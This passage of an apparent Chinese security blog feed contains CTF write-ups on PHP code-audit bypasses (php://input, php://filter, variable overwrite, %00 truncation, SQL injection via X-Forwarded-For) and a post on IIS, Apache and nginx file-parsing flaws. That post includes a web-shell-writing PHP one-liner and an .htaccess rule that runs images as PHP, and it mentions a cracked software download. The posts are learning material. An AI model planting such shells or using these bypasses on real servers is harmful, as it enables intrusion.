title="3.进制转换绕过"></a>3.进制转换绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function noother_says_correct($number)</span><br><span class="line">&#123;</span><br><span class="line">       $one &#x3D; ord(&#39;1&#39;);</span><br><span class="line">       $nine &#x3D; ord(&#39;9&#39;);</span><br><span class="line">       for ($i &#x3D; 0; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit &#x3D; ord($number&#123;$i&#125;);</span><br><span class="line">               if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       return false;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          return $number &#x3D;&#x3D; &#39;54975581388&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$flag&#x3D;&#39;*******&#39;;</span><br><span class="line">if(noother_says_correct($_GET[&#39;key&#39;]))</span><br><span class="line">   echo $flag;</span><br><span class="line">else </span><br><span class="line">   echo &#39;access denied&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码要的是get参数key的值与54975581388相等，但是每一位字符串的assic码要在0到9之外，这里我们可以将54975581388十六进制转码成0xccccccccc绕过</p><p>又一道题<br>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">you are not the number of bugku !   </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];  </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];  </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;  </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not admin ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;  </span><br></pre></td></tr></table></figure><p>这里要求传入是三个参数txt、file、password</p><ul><li>txt：txt参数传给了user变量，file_get_contents($user,’r’)===”welcome to the bugkuctf”，这里我们可以用到php输入流post传值  </li><li>flie：刚开始我以为因为是include（）函数我直接将file=hint.php就可以得出hint.php的值，这里没有考考虑到hint.php的路径问题，所以我们应该使用php://filter  </li><li>password：这里没有对passwor进行限制，可以随意处置<br>payload：?txt=php://input&amp;file=php://filter/content.base64-encode/resoursce=hint.php<br>post:welcome to the bugkuctf<br>得到一个base64的代码，解码得到</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><p>我再次用PHP://filter读取flag.php，它告诉我不能现在就给我flag，后面就搞不懂了</p><h4 id="4-超全局变量"><a href="#4-超全局变量" class="headerlink" title="4.超全局变量"></a>4.超全局变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#39;args&#39;]))&#123; #判断args参数是否存在</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))&#123;#用正则判断看srgs变量中是否有字母及数字，有函数返回1，否0，所以这里让你只能输入字母和数字</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这道题的关键是var_dump函数输出变量的类型和内容，这里就要抠脑壳了，怎么知道flag在哪个变量<br>看书才发现可以使用$GLOBALS超全局数组调用系统中的所有变量和常量以及对象和对象中的属性变量值<br>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。<br>PHP在名为$GLOBALS[index]的数组中存储了所有全局变量。变量的名字就是数组的键。<br>这样我们就给变量赋值args=GLOBALS，使变量为存储了所有变量的数字</p><h4 id="5-变量覆盖-php输入输出流"><a href="#5-变量覆盖-php输入输出流" class="headerlink" title="5.变量覆盖+php输入输出流"></a>5.变量覆盖+php输入输出流</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag&#x3D;&#39;xxx&#39;;</span><br><span class="line">extract($_GET);#存在变量覆盖漏洞</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content&#x3D;trim(file_get_contents($flag));#看到file_get_contents想到PHP:&#x2F;&#x2F;输入输出</span><br><span class="line">if($shiyan&#x3D;&#x3D;$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&#39;flag&#123;xxx&#125;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&#39;Oh.no&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>因为这两种漏洞都写了，只是记住了一道题可以运用多种方法混合区解答<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqb9myprf9j309q056jrc.jpg" alt="image"><br>get传参利用了变量覆盖，将shiyan与content都赋值为0从而绕过，但是由于在覆盖变量之后，会给content重新赋值，所以看到了file_get_contents函数，想到了PHP输入流post传参，通过修改flag的值将content值进行修改  </p><h4 id="6-URLencode二次编码"><a href="#6-URLencode二次编码" class="headerlink" title="6.URLencode二次编码"></a>6.URLencode二次编码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">Access granted!</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line"></span><br><span class="line">flag</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先eregi函数在id参数中查找有没有hackerDJ字符，有则返回0，所以这里我们不能直接赋值hackerDJ，题目提示了二次编码，这里的get传参时已经进行了一次urldecode解码，后面又通过urldecode函数进行了二次解码，所以经过上面这些提示，就是对hackerDJ进行urlencode二次编码，传入参数就是hackerDJ，又到了抠脑壳的时候，为什么hackerDJ用工具编码后还是不变，看了人家的解答后才知道这种纯字符是不能用工具解码的，要对照编码表解码<br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fqbb0rgphnj30ad0mnwf2.jpg" alt="image"><br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fqbb1t901dj30h6015glf.jpg" alt="image">  </p><h4 id="7-数组返回NULL绕过or-00截断"><a href="#7-数组返回NULL绕过or-00截断" class="headerlink" title="7.数组返回NULL绕过or%00截断"></a>7.数组返回NULL绕过or%00截断</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">echo &#39;You password must be alphanumeric&#39;;</span><br><span class="line">else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">die(&#39;Flag: &#39; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &#39;Invalid password&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ereg函数查找password</p><h4 id="8-一道综合题"><a href="#8-一道综合题" class="headerlink" title="8.一道综合题"></a>8.一道综合题</h4><p>never never never give up！！！<br>这道题点开源码发现提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--1p.html--&gt;</span><br><span class="line">never never never give up !!!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>于是打开1p.html，但是发现重定向了，于是直接view-source:得到一串base64编码的代码 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>解码得  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&#39;id&#39;])</span><br><span class="line">&#123;</span><br><span class="line">header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;no no no no no no no&#39;;</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)</span><br><span class="line">&#123;</span><br><span class="line">require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里设置了三个get参数id、a、b，分别对应了三种不同的代码绕过机制  </p><ul><li>id：关于id的值id==0，并不是说是字符零，而是数字0，所以我们只需要给id赋值一个无数字字符串，无数字字符串在比较时会强制类型转换为数字0  </li><li>a：a必须为“bugku is a nice plateform!”首先一个stripos($a,’.’)函数，限制了a不能从外部引用文件，但又出现了file_get_contents，我们想到了input输入流的形式进行post传参</li><li>b：b的长度通过strlen($b)&gt;5限制为5以内，eregi(“111”.substr($b,0,1),”1114”)表示b中必须要有4，但是substr($b,0,1)!=4，所以我们想到了%00截断  </li></ul><p>构造payload：?id=@&amp;a=php://input&amp;b=%0044444 ,<br>post:bugku is a nice plateform!</p><h4 id="9-正则表达式匹配"><a href="#9-正则表达式匹配" class="headerlink" title="9.正则表达式匹配"></a>9.正则表达式匹配</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">highlight_file(&#39;2.php&#39;);</span><br><span class="line">$key&#x3D;&#39;KEY&#123;********************************&#125;&#39;;</span><br><span class="line">$IM&#x3D; preg_match(&quot;&#x2F;key.*key.&#123;4,7&#125;key:\&#x2F;.\&#x2F;(.*key)[a-z][[:punct:]]&#x2F;i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&#39;key is: &#39;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>这道题考察的是正则表达式的匹配  </p><blockquote><p>/key.*key.{4,7}key:/./(.*key)[a-z][[:punct:]]/i  </p></blockquote><p>首先是一个字符串key，后面.表示匹配除/n之外的所有单字符，*表示前面的单字符重复0次或多次，.{4,7}又表示重复除/n以外的单字符4到7次，后面再跟字符串key:，这里\/将/转义，后面（.*key）就是单字符+key，[a-z]表示从中选一个字母，[[:punct:]]表示匹配标点符号<br>payload：?id=key.key…..key:/./.keya;</p><h4 id="10-INSERT-INTO注入"><a href="#10-INSERT-INTO注入" class="headerlink" title="10.INSERT INTO注入"></a>10.INSERT INTO注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);#没有报错回显</span><br><span class="line"></span><br><span class="line">function getIp()&#123;#获取真实ip</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;#先查看X-Forworded-For头是否设置，取其值</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);#将ip变量中的字符串以，为间隔打散成数组</span><br><span class="line">return $ip_arr[0];#所以后面构造sql语句时不能出现，</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);#链接数据库</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);#查询数据库</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot; ;#向client_ip表中插入变量ip的值  </span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;1-php-strcmp-漏洞&quot;&gt;&lt;a href=&quot;#1-php-strcmp-漏洞&quot; class=&quot;headerlink&quot; title=&quot;1.php strcmp()漏洞&quot;&gt;&lt;/a&gt;1.php strcmp()漏洞&lt;/h4&gt;&lt;figure class=&quot;high
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ctf" scheme="http://yoursite.com/child/tags/ctf/"/>
    
      <category term="代码审计" scheme="http://yoursite.com/child/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="web" scheme="http://yoursite.com/child/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>文件解析漏洞学习</title>
    <link href="http://yoursite.com/child/2018/03/03/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/child/2018/03/03/文件解析漏洞学习/</id>
    <published>2018-03-03T04:05:17.000Z</published>
    <updated>2018-03-03T04:06:08.636Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件解析漏洞学习"><a href="#文件解析漏洞学习" class="headerlink" title="文件解析漏洞学习"></a>文件解析漏洞学习</h1><p>解析漏洞主要说的是一些特殊文件被IIS、Apache、nginx在某种情况下解释成脚本文件格式的漏洞</p><h3 id="一、IIS6-0解析漏洞"><a href="#一、IIS6-0解析漏洞" class="headerlink" title="一、IIS6.0解析漏洞"></a>一、IIS6.0解析漏洞</h3><h6 id="1-目录解析"><a href="#1-目录解析" class="headerlink" title="1.目录解析"></a>1.目录解析</h6><p>当文件夹名字以.asp、.asa结尾时，文件夹内的所有文件都将以asp的格式解析，我们就可以想办法修改文件夹名称，再上传任意格式的一句话木马在该文件夹中，从而绕过验证。  </p><h6 id="2-文件解析"><a href="#2-文件解析" class="headerlink" title="2.文件解析"></a>2.文件解析</h6><p>在IIS中解析文件名，系统通常都是从左到右读取文件名，假如我们上传一个文件1.asp;jpg,在前端验证时直接从后面读取文件名.jpg,上传成功！而在服务器中则是以.asp格式解析。<br>也可以使用bp抓包改包绕过前端验证。<br>还有一种就是利用重定向，在IIS6.0中安装了Rewrite这个ISAPI，下载ISAPIrewrite破解版 点击下载此文件<br>安装之后把Cracked里的ISAPI_Rewrite.dll，替换掉安装目录里的ISAPI_Rewrite.dll，就破解了。注意，停掉IIS再替换！</p><p>在httpd.ini加入了以下规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule (.*).asp&#x2F;(.*) &#x2F;no.gif  </span><br><span class="line">RewriteRule (.*).Asp&#x2F;(.*) &#x2F;no.gif   </span><br><span class="line">RewriteRule (.*).aSp&#x2F;(.*) &#x2F;no.gif  </span><br><span class="line">RewriteRule (.*).asP&#x2F;(.*) &#x2F;no.gif  </span><br><span class="line">RewriteRule (.*).ASp&#x2F;(.*) &#x2F;no.gif   </span><br><span class="line">RewriteRule (.*).AsP&#x2F;(.*) &#x2F;no.gif  </span><br><span class="line">RewriteRule (.*).aSP&#x2F;(.*) &#x2F;no.gif   </span><br><span class="line">RewriteRule (.*).ASP&#x2F;(.*) &#x2F;no.gif</span><br></pre></td></tr></table></figure><p>这样访问所有的带有“.asp/”的URL全部被重写到<a href="http://test.com/no.jpg,%E8%AE%BF%E9%97%AEhttp://test.com/dir.asp/diy.jpg%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E8%AE%BF%E9%97%AE%E7%9A%84http://test.com/no.jpg">http://test.com/no.jpg,访问http://test.com/dir.asp/diy.jpg其实就是访问的http://test.com/no.jpg</a><br>这样就屏蔽了所有带.asp的文件夹的访问，并且全部显示no.jpg这张警告的图片</p><h3 id="二、Apache解析漏洞"><a href="#二、Apache解析漏洞" class="headerlink" title="二、Apache解析漏洞"></a>二、Apache解析漏洞</h3><p>与IIS相反，Apache解析文件时是从右往左读取文件名，如果遇到不可解析的文件后缀名就继续向左解析，如1.php.xxx,后面的.xxx是Apache无法解析的后缀，则该文件将被解析为PHP格式  </p><h3 id="三、IIS-7-0-IIS-7-5-nginx-lt-8-03畸形解析漏洞"><a href="#三、IIS-7-0-IIS-7-5-nginx-lt-8-03畸形解析漏洞" class="headerlink" title="三、IIS 7.0/IIS 7.5/nginx&lt;8.03畸形解析漏洞"></a>三、IIS 7.0/IIS 7.5/nginx&lt;8.03畸形解析漏洞</h3><p>在默认fast-CGI开启下，我们将以下内容的PHP文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP fputs(fopen(’shell.php’,’w’),’&lt;?php eval_r($_POST[cmd])?&gt;’);?&gt;</span><br></pre></td></tr></table></figure><p>修改为jpg文件上传，假如图片路径为<a href="http://xxx.com/xxx/1.jpg,%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80http://xxx.com/xxx/1.jpg/shell.php,%E5%B0%B1%E4%BC%9A%E5%9C%A8%E5%BD%93%E5%89%8Dxxx%E8%B7%AF%E5%BE%84%E4%B8%8B%E7%94%9F%E6%88%90shell.php%E6%96%87%E4%BB%B6%EF%BC%8C%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%8D%B3%E4%B8%BA">http://xxx.com/xxx/1.jpg,我们需要访问地址http://xxx.com/xxx/1.jpg/shell.php,就会在当前xxx路径下生成shell.php文件，文件内容即为</a><?php eval_r($_POST[cmd])?>，上传一句话木马成功！   </p><h3 id="四、Nginx-lt-8-03空字节代码执行漏洞"><a href="#四、Nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="四、Nginx &lt;8.03空字节代码执行漏洞"></a>四、Nginx &lt;8.03空字节代码执行漏洞</h3><p>试用版本：0.5.*, 0.6.*, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37<br>这个漏洞也是用了%00截断，访问嵌入一句话木马的图 片如xx.jpg改变成xxx.jpg%00.php来执行其中代码  </p><h3 id="五、-htaccess文件解析"><a href="#五、-htaccess文件解析" class="headerlink" title="五、.htaccess文件解析"></a>五、.htaccess文件解析</h3><p>.htaccess是什么？<br>.htaccess叫分布式配置文件，它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。并且子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。一般来说，如果你的虚拟主机使用的是Unix或Linux系统，或者任何版本的Apache网络服务器，从理论上讲都是支持.htaccess的。<br>在这个漏洞里我们又要利用到<FilesMatch>指令，这个指令是用于包含作用于与正则表达式匹配的文件名，执行此漏洞的前提是Apache中.htaccess可被执行、可被写入。我们写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FlilesMatch  &quot;shell.jpg&quot;&gt; SetHandler application&#x2F;x-httpd-php &lt;&#x2F;FlilesMatch&gt;</span><br></pre></td></tr></table></figure><p>再上传shell.jpg的一句话木马，就可以以PHP格式执行。<br>参考：<br><a href="http://blog.sina.com.cn/s/blog_71f010d20101ljgz.html">通杀IIS7.0畸形解析0day漏洞</a><br><a href="https://www.cnblogs.com/qmfsun/p/6170175.html"> Nginx %00空字节执行php漏洞</a><br><a href="https://www.cnblogs.com/kenshinobiy/p/5058430.html">.htaccess重写、安全防护、文件访问权限</a><br><a href="https://www.cnblogs.com/saw2012/archive/2013/05/22/3093583.html">Apache对文件后缀解析的分析利用</a><br><a href="http://cracer.com/">cracer渗透教程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件解析漏洞学习&quot;&gt;&lt;a href=&quot;#文件解析漏洞学习&quot; class=&quot;headerlink&quot; title=&quot;文件解析漏洞学习&quot;&gt;&lt;/a&gt;文件解析漏洞学习&lt;/h1&gt;&lt;p&gt;解析漏洞主要说的是一些特殊文件被IIS、Apache、nginx在某种情况下解释成脚本文件格
      
    
    </summary>
    
    
      <category term="技术" scheme="http://yoursite.com/child/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="web" scheme="http://yoursite.com/child/tags/web/"/>
    
      <category term="文件解析" scheme="http://yoursite.com/child/tags/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Google hacking利用简介</title>
    <link href="http://yoursite.com/child/2018/02/27/GOOGLE%20%20HAKING/"/>
    <id>http://yoursite.com/child/2018/02/27/GOOGLE  HAKING/</id>
    <published>2018-02-27T04:06:17.000Z</published>
    <updated>2018-02-27T04:21:22.145Z</updated>
    
